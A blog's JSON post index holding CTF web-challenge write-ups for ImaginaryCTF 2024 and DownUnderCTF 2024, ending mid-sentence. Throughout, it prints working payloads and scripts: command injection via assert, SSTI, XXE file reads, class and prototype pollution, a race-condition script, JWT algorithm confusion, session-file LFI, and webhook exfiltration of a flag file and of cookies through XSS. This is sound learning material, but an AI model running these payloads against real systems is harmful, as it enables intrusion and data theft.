[ { "title": "ImaginaryCTF 2024 [WEB]", "url": "/posts/ImaginaryCTF-2024/", "categories": "ctf", "tags": "ctf, writeup", "date": "2024-07-22 08:00:00 +0800", "snippet": "Web CategoryTable of Content readme journal P2C crystal The Amazing Race readme2 Pwning en LogiqueAll of the challenge archives can be found herereadmeLooking at NGINX default.conf, if the file exists in the server it will give the user 404 Errorserver { listen 80 default_server; listen [::]:80; root /app/public; location / { if (-f $request_filename) { return 404; } proxy_pass http://localhost:8000; }}The location of flag located in the same folder as index.html named flag.txt. Browsing directly the WEB URL, will give the user the following response.└─$ curl http://readme.chal.imaginaryctf.org/&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;\t&lt;head&gt;\t\t&lt;meta charset=\"UTF-8\" /&gt;\t\t&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\t\t&lt;title&gt;Hello World&lt;/title&gt;\t&lt;/head&gt;\t&lt;body&gt;\t\tIt works!\t&lt;/body&gt;&lt;/html&gt; Accessing, flag.txt or index.html will give 404 Error└─$ curl http://readme.chal.imaginaryctf.org/index.html&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx/1.22.1&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;How can we bypass this? Atleast we know the version of the NGINX used is 1.22.1. Searching for request_filename in the NGINX configuration file led us to this Hacktricks : Proxy Protections Bypass article.Either using Burp or use a simple netcat method as shown below to get the flag.└─$ echo -e \"GET /flag.txt\\xA0\\x0aHTTP/1.1\" | nc readme.chal.imaginaryctf.org 80 ictf{path_normalization_to_the_resFlag: ictf{path_normalization_to_the_resjournalWhen I read the index.php, there is one line that catch my eyes&lt;?phpecho \"&lt;p&gt;Welcome to my journal app!&lt;/p&gt;\";echo \"&lt;p&gt;&lt;a href=/?file=file1.txt&gt;file1.txt&lt;/a&gt;&lt;/p&gt;\";echo \"&lt;p&gt;&lt;a href=/?file=file2.txt&gt;file2.txt&lt;/a&gt;&lt;/p&gt;\";echo \"&lt;p&gt;&lt;a href=/?file=file3.txt&gt;file3.txt&lt;/a&gt;&lt;/p&gt;\";echo \"&lt;p&gt;&lt;a href=/?file=file4.txt&gt;file4.txt&lt;/a&gt;&lt;/p&gt;\";echo \"&lt;p&gt;&lt;a href=/?file=file5.txt&gt;file5.txt&lt;/a&gt;&lt;/p&gt;\";echo \"&lt;p&gt;\";if (isset($_GET['file'])) { $file = $_GET['file']; $filepath = './files/' . $file; // This line look suspicious? assert(\"strpos('$file', '..') === false\") or die(\"Invalid file!\"); if (file_exists($filepath)) { include($filepath); } else { echo 'File not found!'; }}echo \"&lt;/p&gt;\";Our input directly used in the assert() function. Won’t that be dangerous? After try and error we can read the flag with the following payload# URL Encodedtest%27,%27..%27)%20or%20die(system(%27cat%20/flag*.txt%27));//# Original test','..') or die(system('cat /flag*.txt'));//Flag: ictf{assertion_failed_e3106922feb13b10}P2CI feel that my solution for this challenge is unintended. By using local environment, I noticed that it’s possible to execute python code. If we insert print(1).The following temporary file with code*.py will be created in /tmp/uploads directory.Since we are able to inject any python code in main() function. We just need to create a payload that will send us back the flag.txt content. But the docker environment did not include wget or curl. So, I used curl static binary to exfiltrate flag.txtimport base64,oscurl_content=b\"&lt;BASE64_CURL_CONTENT\"open(\"/tmp/curl\",\"wb\").write(curl_content)os.system(\"chmod +x /tmp/curl;/tmp/curl https://&lt;WEBHOOK_SERVER&gt;/?content=`cat flag.txt |base64 -w0`\")NOTES: Actually urllib library can be use also xD# POST Methodfrom urllib.request import urlopen, Requesthttprequest = Request('https://&lt;WEBHOOK&gt;/',data=open(\"flag.txt\",\"r\"),method='POST')urlopen(httprequest)# GET Methodfrom urllib.request import urlopen, Requesthttprequest = Request('https://&lt;WEBHOOK&gt;/?='+open(\"flag.txt\",\"r\").read())urlopen(httprequest)Flag: ictf{d1_color_picker_fr_2ce0dd3d}crystalThis is a web challenge with Ruby framework. Interestingly, there is not much in app.rbrequire 'sinatra'# Route for the index pageget '/' do erb :indexendThe flag not located in usual place but embedded in the hostname.version: '3.3'services: deployment: hostname: $FLAG build: . ports: - 10001:80How could we possibly get the hostname from the web? Is it possible that we could get the hostname through error page or invalid page? By sending a random path, we get the following page.By sending a POST request, we get the following response.└─$ curl -XPOST http://crystals.chal.imaginaryctf.org WEBrick::HTTPStatus::LengthRequired: WEBrick::HTTPStatus::LengthRequired\t/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:530:in `read_body'\t/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:257:in `body'\t/var/lib/gems/3.0.0/gems/rackup-2.1.0/lib/rackup/handler/webrick.rb:67:in `block in initialize'What if we send all special characters and see if we could get different response? I use the following script and identify few characters that could get us the flag!# Scriptfor chars in '!' '@' '#' '$' '%' '^' '&amp;' '*' '(' ')' '-' '=' '+' '[' ']' '{' '}' ';' ':' '\"' \"'\" '&lt;' '&gt;' ',' '.' '/' '?' '\\\\' '|' '`'; do echo $chars;echo;curl -ks \"http://crystals.chal.imaginaryctf.org/\"$chars| grep -i ictf;done# Characters with Bad URI ^\"&lt;&gt;\\|`Flag: ictf{seems_like_you_broke_it_pretty_bad_76a87694}The Amazing RaceTo get the source code, we need to hit the following endpoints:maze.py = /mazeapp.py = /sourceDockerfile = /dockerIt took me a while to understand the code, but atleast we know how to get the flag. From app.py, the solved variable will be use to determine if we can get the flag or notMAZE_SIZE = 35@app.route(\"/&lt;mazeId&gt;\")def index(mazeId): if not mazeId: return redirect(f\"/{createMaze()}\") # if our maze ID location equal to this value we can get the flag # getloc(mazeId) == (34,34) solved=getLoc(mazeId) == (MAZE_SIZE-1, MAZE_SIZE-1) return render_template(\"maze.html\", maze=getMaze(mazeId), mazeId=mazeId, flag=open(\"flag.txt\").read() if solved else \"\" )But looking at the maze page, we probably need to find a way to get into F.The neighbour of F will be sets to #.def gen(self): ... self.set(*([self.size-1]*self.dim), val='F') for i in self.neighbors(*([self.size-1]*self.dim)): self.set(*i, val='#')I tried to solve the maze using python but actually that’s not the right path because of the above restrictions :’) Thanks @vicevirus and @zx for finding the right path! It’s related to race condition attack.import sys,requests,threadingfrom bs4 import BeautifulSoup as bsimport time# Global VariablesTARGET = \"http://the-amazing-race.chal.imaginaryctf.org/\"TARGET_MOVE = \"http://the-amazing-race.chal.imaginaryctf.org/move\"MAZE_ID = \"\"# Function : getMaze()def getMaze(): resp = requests.get(TARGET,verify=False) soup=bs(resp.text, 'html.parser') maze = soup.find('code').text.strip() mazeid = resp.url.split(\"/\")[-1] return maze,mazeiddef getCurrentMaze(): resp = requests.get(TARGET,verify=False) soup=bs(resp.text, 'html.parser') maze = soup.find('code').text.strip() return mazedef moveDown(): requests.post(TARGET_MOVE,verify=False,headers={\"Content-Type\":\"application/x-www-form-urlencoded\"},data={\"Down\":\"Down\"},params = {'id': MAZE_ID,'move': 'down'})def moveRight(): requests.post(TARGET_MOVE,verify=False,headers={\"Content-Type\":\"application/x-www-form-urlencoded\"},data={\"Right\":\"Right\"},params = {'id': MAZE_ID,'move': 'right'})def moveLeft(): requests.post(TARGET_MOVE,verify=False,headers={\"Content-Type\":\"application/x-www-form-urlencoded\"},data={\"Left\":\"Left\"},params = {'id': MAZE_ID,'move': 'left'})def moveUp(): requests.post(TARGET_MOVE,verify=False,headers={\"Content-Type\":\"application/x-www-form-urlencoded\"},data={\"Up\":\"Up\"},params = {'id': MAZE_ID,'move': 'up'})if __name__ == \"__main__\": # Get Maze maze,MAZE_ID = getMaze() TARGET = TARGET+MAZE_ID print(maze) print() while (\"ictf\" not in requests.get(TARGET,verify=False).text): before = getCurrentMaze() # Race down for i in range(10): th = threading.Thread(target=moveDown, args=()) th.start() # Race right for i in range(10): th = threading.Thread(target=moveRight, args=()) th.start() after = getCurrentMaze() if before == after: moveLeft() moveUp() print(getCurrentMaze()) print() else: print(getCurrentMaze()) print() print(requests.get(TARGET,verify=False).text)NOTES: After the event I read some articles related to Database Race Conditions. You can find the article belowLink: https://medium.com/@C0l0red/database-race-conditions-f459d94ee2d0Flag : ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}readme2This challenge using Bun to create a HTTP server.There are two (2) ports involved which are 3000 (internal) and 4000 (external). There are few restrictions in here that could restrict the user from adding any flag keywords in URL or HTTP Headers. To get the flag, the user need to send a request to /flag.txt on port 3000.There is one interesting line that catch my eyes.return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), { method: req.method, headers: req.headers, body: req.body})Searching around, I discovered this article by Mizu. Reading through the writeup, the payload that he used was \\\\127.0.0.1\\a. When I put \\\\google.com it redirected to official Google website.At first, I got no clue for the next steps. But, thanks to @vicevirus hints the solution would be to utilize fetch() redirection.For this, we may need to setup a HTTP server that will redirect to http://localhost:3000/flag.txtfrom flask import Flask, redirectapp = Flask(__name__)@app.route(\"/\", methods=[\"GET\"])def index(): return redirect(\"http://localhost:3000/flag.txt\")\tif __name__ == '__main__': app.run(host=\"0.0.0.0\", port=8080)Then, send the payload as shown in the picture.Flag: ictf{just_a_funny_bug_in_bun_http_handling}Pwning en LogiqueFor this challenge, I didn’t manage to solve it during the event. But for learning purpose, let’s go through together from what have been discussed in the Official discord server.FORMAT STRING VULNERABILITYLooking at the greet, there is a usage of format() function.greet(Request) :- http_session_data(username(Username)), http_parameters(Request, [ greeting(Greeting, [default('Hello')]), format(Format, [default('~w, ~w!')]) ]), content_type, format(Format, [Greeting, Username]).If we use the default creds guest:guest and access /greet we will get the following response.Im not familiar with prolog but actually there are two (2) HTTP parameters that we can use greeting and format.But is there anything that we could abused from these parameters? At the end our input will go through the following code:# Originalformat(Format, [Greeting, Username])# Input: greeting=Hello, format='~w, ~w!'format('~w, ~w!', ['Hello', 'guest'])More information about format string can be found in here. I noticed that the error of using “~@” will call a prologue predicate.Unknown procedure: test123/0Maybe we need to find prologue predicate that ends with /0? Searching around, I found this and this page. Try and error, I found a good candidate that can be use to get our flag!edit/0 == will open the editor of server.pl locally (Cannot use remotely I guess?)listing/0 == lists all predicates defined Link to listing/0 predicate: https://www.swi-prolog.org/pldoc/man?predicate=listing/0ARBITRARY CONTENT-TYPEAnother solution discussed in the discord server is not related to format string issue. I found some good reference in hereIf we look into login function, there is no content-type restrictions in here as well as the usage of member() to check the Users list.login(Request) :- member(method(post), Request), http_read_data(Request, Data, []), (( member(username=Username, Data), member(password=Password, Data), users(Users), member(Username=Password, Users), http_session_retractall(_OldUsername), http_session_assert(username(Username)), http_redirect(see_other, '/greet', Request) );By sending the following request, I assumed (I’m not really sure.. Could be wrong) it will use with the following checkmember(guest='password',[guest=guest,'AzureDiamond'=hunter2,admin=AdminPass]).# Resultfalse.But if we use content type application/x-prolog, we could set the password to uninitialized variable. This will let us to bypass the authentication as it will always set to true.member(guest=Unknownvariable,[guest=guest,'AzureDiamond'=hunter2,admin=AdminPass]).# ResultUnknownvariable = guest . (true?)With this in knowledge, we could send the following data to login as admin and get the flag.[username=admin,password=Unknownvariable]." }, { "title": "DownUnderctf 2024 [WEB]", "url": "/posts/DownUnderCTF-2024/", "categories": "ctf", "tags": "ctf, writeup", "date": "2024-07-08 08:00:00 +0800", "snippet": "Category : WebTable of Content parrot the emu zoo feedback form co2 hah got em sniffy i am confusion co2v2 waifu prisoner processorAll of the challenge archives can be found hereWeb (beginner) : parrot the emuLooking at the source code (app.py), it can clearly be seen that the user_input is passed directly into the render_template_string() function.Since our input is passed directly to render_template_string(), this causes the function to evaluate our input, leading to Server-Side Template Injection (SSTI).To get the flag, use the following payload:{{ request.__class__._load_form_data.__globals__.__builtins__.open(\"flag\").read() }}Flag: DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}Web (beginner) : zoo feedback formThe code below shows that the user XML input is passed directly into the etree.fromstring() function. This means that if an attacker sends a malicious XML payload (for example, an XML External Entity (XXE) injection), the server will process it, potentially leading to data exfiltration.To get the flag, use the following payload:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE kaibro[ &lt;!ENTITY xxe SYSTEM \"file:///app/flag.txt\"&gt;]&gt;&lt;root&gt; &lt;feedback&gt;&amp;xxe;&lt;/feedback&gt;&lt;/root&gt;Flag: DUCTF{emU_say$_he!!0_h0!@_ci@0}Web : co2Looking at the source code (routes.py), the only way to get the flag is for the flag variable to be true.@app.route(\"/get_flag\")@login_requireddef get_flag(): if flag == \"true\": return \"DUCTF{NOT_THE_REAL_FLAG}\" else: return \"Nope\"First, the user needs to register an account and then log in as that user. (There is no issue with the registration and login functionality) After login, the user can view a new feature called FeedbackSubmitting the form will get us the following request and response.The code used in the feedback function actually has several interesting lines, especially the comment. When I first read this code, I wondered if it’s possible to perform prototype pollution to change the flag variable to true.@app.route(\"/save_feedback\", methods=[\"POST\"])@login_requireddef save_feedback(): data = json.loads(request.data) feedback = Feedback() # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object. merge(data, feedback) save_feedback_to_disk(feedback) return jsonify({\"success\": \"true\",\"flag\":flag}), 200I saw similar lines of codes in this article. Thus, the following payload can be use to change the value of global variable flag to true.{\"__class__\":{ \"__init__\":{ \"__globals__\":{ \"flag\":\"true\" } } }}Using the same session cookies, we can retrieve the flag since the global variable flag has been changed to true.Flag: DUCTF{_cl455_p0lluti0n_ftw_}Web : hah got emThe file given to us mentions the version of gotenberg used, which is 8.0.3.FROM gotenberg/gotenberg:8.0.3COPY flag.txt /etc/flag.txtActually, the latest version of gotenberg already 8.8.0. The following are the details of release date for both versions.gotenberg v8.0.3 = Februrary 2024gotenberg v8.8.0 = July 2024Mhmm… Could there be an issue we can exploit? After going through each version, I noticed valuable information in the next version after 8.0.3, which is 8.1.0.Comparing with both version in here, I was lucky to find something fishy at the bottom page which show a test data that just added?This led me to this GitHub issue, which is assigned with CVE-2021-23345. Thus, the following payload works to read the flag using the newly added test data.# Payload&lt;iframe src=\"\\\\localhost/etc/flag.txt\"&gt;&lt;/iframe&gt;# Commandcurl --request POST --url https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/html --header 'Content-Type: multipart/form-data' --form files=@index.html -o flag.pdfFlag : DUCTF{dEeZ_r3GeX_cHeCK5_h4h_g0t_eM}Web : sniffyThe code in audio.php show that there is possibility of Local File Inclusion (LFI) but it will check the mime content type. With this check, it looks impossible for us to read anything without the right audio content.&lt;?php$file = 'audio/' . $_GET['f'];if (!file_exists($file)) {\thttp_response_code(404); die;}$mime = mime_content_type($file);if (!$mime || !str_starts_with($mime, 'audio')) {\thttp_response_code(403); die;}header(\"Content-Type: $mime\");readfile($file);How can we read the flag in $_SESSION['flag']? Could it be related to a PHP issue? After thinking for a while, I realized that if we could read our current session file, we might be able to read the flag!$_SESSION['flag'] = FLAG; /* Flag is in the session here! */Reading the article in here give me some hint that the session file located in /tmp.But how does mime_content_type() determine if a file is an audio file or not? Does it check the file signature? Looking into this documentation, it was mentioned that:Returns the MIME content type for a file as determined by using information from the magic.mime file. As I looked for examples of magic.mime, I discovered this file. After some try and error, I found the following strings that we could use (but are not limited to) to identify our file as an audio file, as it checks the string from the 1080-byte position.M.K.M!K!FLT416CNThe following script can be use to get the flag.import requestscookies = {\"PHPSESSID\":\"hijack\"}for i in range(10): inject = \"A\"*i+\"16CN\"*270 requests.get(f\"https://web-sniffy-d9920bbcf9df.2024.ductf.dev/?theme={inject}\",cookies=cookies) r = requests.get(f\"https://web-sniffy-d9920bbcf9df.2024.ductf.dev/audio.php?f=../../../../../tmp/sess_hijack\") if r.status_code != 403: print(r.text)Flag: DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}Web : i am confusionIt’s possible to login as any username and password but browsing the admin page will redirect the user to unintended page.Again, source code review! Below are the code for accessing admin page.const verifyAlg = { algorithms: ['HS256','RS256'] }const signAlg = { algorithm:'RS256' }app.get('/admin.html', (req, res) =&gt; { var cookie = req.cookies; // Verify the JWT jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) =&gt; { if (err) { res.status(403).send(\"403 -.-\"); // If user key == admin -&gt; get the flag! } else if (decoded_jwt['user'] == 'admin') { res.sendFile(path.join(__dirname, 'admin.html')) // flag! } else { res.status(403).sendFile(path.join(__dirname, '/public/hehe.html')) } })})The signAlg was used in the login function.const jwt_token = jwt.sign(payload, privateKey, signAlg)I’m not an expert with JWT, but it seems suspicious that two algorithms are used to verify the JWT. While searching, I found this GitHub Advisory mentioning that the json-web-token library versions &lt;= 3.1.1 are vulnerable to a JWT algorithm confusion attack. Inside the package.json challenge file, it stated that the version of jsonwebtoken was ^4.0.0. But looking in here it was mentioned that There is no fixed version ? Let’s just try the exploit!Public key recoveryFirst, retrieve two (2) different JWT tokens and utilize jwt_forgery.py to generate a few public keys.python3 jwt_forgery.py \"&lt;JWT_TOKEN_1&gt;\" \"&lt;JWT_TOKEN_2&gt;\"Algorithm confusionUse each of the generated .pem files and change the JWT to the HS256 algorithm. Ensure to change the user to an admin.python3 jwt_tool.py \"&lt;token&gt;\" -I -pc user -pv admin -X k -pk publickey.pemFlag: DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}Web : co2v2This challenge is an improvement of co2. Most of the endpoints look the same but following are the relevant new added lines of codes.# Secret used to generate a nonce to be used with the CSP policy SECRET_NONCE = generate_random_string()# Use a random amount of characters to append while generating nonce value to make it more secureRANDOM_COUNT = random.randint(32,64)TEMPLATES_ESCAPE_ALL = TrueTEMPLATES_ESCAPE_NONE = Falsedef generate_nonce(data): nonce = SECRET_NONCE + data + generate_random_string(length=RANDOM_COUNT) sha256_hash = hashlib.sha256() sha256_hash.update(nonce.encode('utf-8')) hash_hex = sha256_hash.hexdigest() g.nonce = hash_hex return hash_hex@app.before_requestdef set_nonce(): generate_nonce(request.path)@app.after_requestdef apply_csp(response): nonce = g.get('nonce') csp_policy = ( f\"default-src 'self'; \" f\"script-src 'self' 'nonce-{nonce}' https://ajax.googleapis.com; \" f\"style-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; \" f\"script-src-attr 'self' 'nonce-{nonce}'; \" f\"connect-src *; \" ) response.headers['Content-Security-Policy'] = csp_policy return response# Future Admin routes - FOR TEST ENVIRONMENT ONLY@app.route(\"/admin/update-accepted-templates\", methods=[\"POST\"])@login_requireddef update_template(): data = json.loads(request.data) # Enforce strict policy to filter all expressions if \"policy\" in data and data[\"policy\"] == \"strict\": template_env.env = Environment(loader=PackageLoader(\"app\", \"templates\"), autoescape=TEMPLATES_ESCAPE_ALL) # elif \"policy\" in data and data[\"policy\"] == \"lax\": # template_env.env = Environment(loader=PackageLoader(\"app\", \"templates\"), autoescape=TEMPLATES_ESCAPE_NONE) # TO DO: Add more configurations for allowing LateX, XML etc. to be configured in app return jsonify({\"success\": \"true\"}), 200@app.route(\"/api/v1/report\")@limiter.limit(\"6 per minute\")def report(): resp = requests.post(f'{os.getenv(\"XSSBOT_URL\", \"http://xssbot:8000\")}/visit', json={'url': os.getenv(\"APP_URL\", \"http://co2v2:1337\") }, headers={ 'X-SSRF-Protection': '1' }) print(resp.text) return jsonify(status=resp.status_code)The flag can be found in src/cookiejar, and since httponly was set to true, it’s possible to steal the cookies! This indicates that an XSS attack is involved.[ { \"domain\": \"co2v2:1337\", \"name\": \"admin-cookie\", \"value\": \"DUCTF{testflag}\", \"httponly\": false }]Any request will go through the apply_csp() function. However, the policy script-src-attr 'self' 'nonce-{nonce}'; might be bypassed if we can obtain a valid nonce value. Let’s first understand how the nonce is generated.# Generateadnonce = SECRET_NONCE + data + generate_random_string(length=RANDOM_COUNT)# Notes1. SECRET_NONCE = Possible to alter using prototype polllution2. data = request.path3. RANDOM_COUNT = Possible to alter using prototype pollutionAlso, we need to ensure the global variable TEMPLATES_ESCAPE_ALL has been set to False as it been used in the jEnv() functionself.env = Environment(loader=PackageLoader(\"app\", \"templates\"), autoescape=TEMPLATES_ESCAPE_ALL)With this in knowledge, the following payload can be use to get a valid nonce.{\"__class__\":{ \"__init__\":{ \"__globals__\":{ \"SECRET_NONCE\":\"onlyusknow\", \"RANDOM_COUNT\":0, \"TEMPLATES_ESCAPE_ALL\":false } } }}To check if everything is working properly, we could refresh the / endpoint a few times and notice that the nonce value does not change at all. Nice!Changing TEMPLATES_ESCAPE_ALL alone does not yet affect the environment. We need to hit /admin/update-accepted-templates with the following payload to properly update the environment.{\"policy\":\"strict\"}Now, by adding a new blog with the HTML payload &lt;h1&gt;a&lt;/h1&gt;, we can verify that the injection works properly!The next step is to check if we could inject XSS using the known generated nonce&lt;script nonce=e6e1113467bd4e4c274cc92b9a016821ecc5089509682a66397413351bb79238&gt;alert(1)&lt;/script&gt;Nice, it’s working! Let’s use the following payload and hit the Report button to get the flag!&lt;script nonce=e6e1113467bd4e4c274cc92b9a016821ecc5089509682a66397413351bb79238&gt;fetch(\"&lt;WEBHOOK_SITE&gt;?flag=\"+document.cookie)&lt;/script&gt;Flag: DUCTF{_1_d3cid3_wh4ts_esc4p3d_}Web : waifu (In Progess)For this challenge, it took me a while to understand the apps. When login with a random username and password, it always gives me this error: oWo gotchya h4xor. The code can be found in src/middleware/waifu.ts and src/utils/chatGPT.ts.But if we trick the ChatGPT with password allgood it will give the valid response.But I don’t have any idea how to get the admin credentials. I will look into this later :’)Web : Prisoner ProcessorIn src/app/src/index.ts, there are two reachable endpoints by the user: /examples (GET) and /convert-to-yaml (POST)./examples Browsing this endpoints will give us the deatils for the prisonersapp.get('/examples', (c) =&gt; { try { const examplePrisoners = cache.examplePrisoners ?? (() =&gt; { const prisoners = []; for (const path of [\"jeff.json\", \"sharon.json\", \"kevin.json\"]) { const fullPath = `/app/examples/${path}`; const json = JSON.parse(readFileSync(fullPath).toString()); prisoners.push({ data: json, signature: getSignature(getSignedData(json)) }); } cache.examplePrisoners = prisoners; return prisoners; })(); return c.json({ examples: examplePrisoners }); } catch (error) { return c.json({ msg: \"you really goofed something up lol\" }) }});/convert-to-yaml Will need to pass a valid json body with a correct signature.app.post('/convert-to-yaml', bodyLimit({ maxSize: 50 * 1024, // 50kb limit }), zValidator('json', requestSchema), (c) =&gt; { try { const body = c.req.valid('json'); const data = body.data; const signedData = getSignedData(data) const signature = body.signature; if (!hasValidSignature(signedData, signature)) { return c.json({ msg: \"signatures do no match!\" }, 400); } const outputPrefix = z.string().parse(signedData.outputPrefix ?? \"prisoner\"); const outputFile = `${outputPrefix}-${randomBytes(8).toString(\"hex\")}.yaml`; if (convertJsonToYaml(data, outputFile)) { return c.json({ msg: outputFile }); } else { return c.json({ msg: \"failed to convert JSON\" }, 500); } } catch (error) { console.error(error); return c.json({ msg: \"why you send me a bad request???\" }, 400); } }); Sending with wrong signature will give this error. Sending with correct signature will saved the content into one .yaml file in /app-data/yamls/. Analyzing getSignedData() function, it will check any parameter that starts with prefix signed.const SIGNED_PREFIX = \"signed.\";const getSignedData = (data: any): any =&gt; { const signedParams: any = {}; for (const param in data) { if (param.startsWith(SIGNED_PREFIX)) { const keyName = param.slice(SIGNED_PREFIX.length); signedParams[keyName] = data[param]; } } return signedParams;};// Examples// Input : \"signed.name\":\"somevalue\"// Process : signedParams[\"name\"] = data[\"signed.name\"] Analyzing getSignature() and hasValidSignature() function it will loop our object and create a signature based on the key and value. It will then compare the signature calculated and the signature we give in the request.const getSignature = (data: any): string =&gt; { const toSignArray = Object.entries(data).map(([k, v]) =&gt; `${k}=${v}`); toSignArray.sort(); return createHmac('sha256', SECRET_KEY) .update(toSignArray.join(\"&amp;\")) .digest(\"hex\");};const hasValidSignature = (data: any, signature: string): boolean =&gt; { const signedInput = getSignature(data); return signedInput === signature};A. Bypass The Signature with Prototype PollutionThe next interesting variable is outputPrefix, as it could change the filename if we can control it. But, how can we alter our JSON signed body without affect the signature value? The following code is to verify if we could use prototype pollution to change the value of outputPrefixconst body = { \"data\":{\"signed.name\":\"jeff\",\"signed.animalType\":\"emu\",\"signed.age\":12,\"signed.crime\":\"assault\",\"signed.description\":\"clotheslined someone with their neck\",\"signed.start\":\"2024-03-02T10:45:01Z\",\"signed.release\":\"2054-03-02T10:45:01Z\",\"signed.__proto__\":{\"outputPrefix\":\"hijack\"}},\"signature\":\"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13\"};const SIGNED_PREFIX = \"signed.\";const getSignedData = (data) =&gt; { const signedParams = {}; for (const param in data) { if (param.startsWith(SIGNED_PREFIX)) { const keyName = param.slice(SIGNED_PREFIX.length); signedParams[keyName] = data[param]; } } return signedParams;};const signedData = getSignedData(body.data)console.log(signedData.outputPrefix);// Output : hijackFrom the above code, we can conclude it’s possible to use prototype pollution and change the value of outputPrefix. But we have another item to confirm, would the following code from getSignature() will be an issue for us by adding a new key and value?createHmac = require('crypto').createHmac;randomBytes = require('crypto').randomBytes;const SECRET_KEY = randomBytes(64);const SIGNED_PREFIX = \"signed.\";const getSignedData = (data) =&gt; { const signedParams = {}; for (const param in data) { if (param.startsWith(SIGNED_PREFIX)) { const keyName = param.slice(SIGNED_PREFIX.length); signedParams[keyName] = data[param]; } } return signedParams;};// Originalconst body = { \"data\":{\"signed.name\":\"jeff\",\"signed.animalType\":\"emu\",\"signed.age\":12,\"signed.crime\":\"assault\",\"signed.description\":\"clotheslined someone with their neck\",\"signed.start\":\"2024-03-02T10:45:01Z\",\"signed.release\":\"2054-03-02T10:45:01Z\"}};const signedData = getSignedData(body.data)const toSignArray = Object.entries(signedData).map(([k, v]) =&gt; `${k}=${v}`);toSignArray.sort();console.log(createHmac('sha256', SECRET_KEY).update(toSignArray.join(\"&amp;\")).digest(\"hex\"));// With Protoype Pollution \"outputPrefix\"const body2 = { \"data\":{\"signed.name\":\"jeff\",\"signed.animalType\":\"emu\",\"signed.age\":12,\"signed.crime\":\"assault\",\"signed.description\":\"clotheslined someone with their neck\",\"signed.start\":\"2024-03-02T10:45:01Z\",\"signed.release\":\"2054-03-02T10:45:01Z\",\"signed.__proto__\":{\"outputPrefix\":\"hijack\"}},\"signature\":\"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13\"};const signedData2 = getSignedData(body2.data);const toSignArray2 = Object.entries(signedData2).map(([k, v]) =&gt; `${k}=${v}`);toSignArray2.sort();console.log(createHmac('sha256', SECRET_KEY).update(toSignArray2.join(\"&amp;\")).digest(\"hex\"));//└─$ node poc.js//342708064e49c23df698fae8b1189c620f87bab1beadcc441edbc289f47f46d3//342708064e49c23df698fae8b1189c620f87bab1beadcc441edbc289f47f46d3It seems like Object.entries() wont affect our signature with __proto__ added. I got no idea but asking ChatGPT actually give me new information (Unsure about the fact).__proto__ itself is not enumerable, so it won't be included in the iteration regardless of the method used.Reading the Object.entries() documentation also make sense.B. Truncation issue with Null Byte in BunSince we can modify the value of outputPrefix, the next step is to understand how the file will be written. From the code below, the file will be written using Bun.// Important Variableconst OUTPUT_YAML_FOLDER = \"/app-data/yamls\";const BANNED_STRINGS = [ \"app\", \"src\", \".ts\", \"node\", \"package\", \"bun\", \"home\", \"etc\", \"usr\", \"opt\", \"tmp\", \"index\", \".sh\"];// Function checkIfContainsBannedString()const checkIfContainsBannedString = (outputFile: string): boolean =&gt; { for (const banned of BANNED_STRINGS) { if (outputFile.includes(banned)) { return true } } return false;}// Function convertJsonToYaml()const convertJsonToYaml = (data: any, outputFileString: string): boolean =&gt; { if (checkIfContainsBannedString(outputFileString)) { return false } const filePath = `${OUTPUT_YAML_FOLDER}/${outputFileString}`; const outputFile = Bun.file(filePath); // Prevent accidental overwriting of app files if (existsSync(outputFile)) { return false } try { const yamlData = stringify(data); Bun.write(outputFile, yamlData); return true; } catch (error) { console.error(error) return false; }};const outputFile = `${outputPrefix}-${randomBytes(8).toString(\"hex\")}.yaml`;if (convertJsonToYaml(data, outputFile)) { return c.json({ msg: outputFile });} else { return c.json({ msg: \"failed to convert JSON\" }, 500);}Is it possible to end with a different extension instead of .yaml? If yes, where should we upload it? Let’s start by fuzzing different characters that could possibly truncate the extension at the end.import requestslist_chars = [\"1\\n\",\"2\\00\",\"3%00\",\"4%0a\",\"5\\u0000\",\"6\\t\",\"7\\r\\n\"]for i in list_chars: body = {\"data\":{\"signed.name\":\"jeff\",\"signed.animalType\":\"emu\",\"signed.age\":12,\"signed.crime\":\"assault\",\"signed.description\":\"clotheslined someone with their neck\",\"signed.start\":\"2024-03-02T10:45:01Z\",\"signed.release\":\"2054-03-02T10:45:01Z\",\"signed.__proto__\":{\"outputPrefix\":\"hijack\"}},\"signature\":\"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13\"} body[\"data\"][\"signed.__proto__\"][\"outputPrefix\"]+=i r = requests.post(\"http://localhost:1337/convert-to-yaml\",json=body) print(r.text)# └─$ python3 fuzzing_chars.py# {\"msg\":\"hijack1\\n-ffa0e9bd0fcef840.yaml\"}# {\"msg\":\"hijack2\\u0000-1ced8e4a1dce4bb4.yaml\"}# {\"msg\":\"hijack3%00-0472e6d1353275ac.yaml\"}# {\"msg\":\"hijack4%0a-ba07b231030f1baf.yaml\"}# {\"msg\":\"hijack5\\u0000-38aabe96b54279ac.yaml\"}# {\"msg\":\"hijack6\\t-b6d177d4927dbbee.yaml\"}# {\"msg\":\"hijack7\\r\\n-b86dd8d1d1091398.yaml\"}The result show that Bun will truncate everything after the null byte.C. Bypass BANNED_STRINGS with Symlink /proc/self/fd/3In /app, we can see few files that might be interesting to overwrite. But how to access /app without having app keyword in outputPrefix?Looking into each one of the fd folder, there is one symlink to /app/src/index.ts.With this, we can actually use 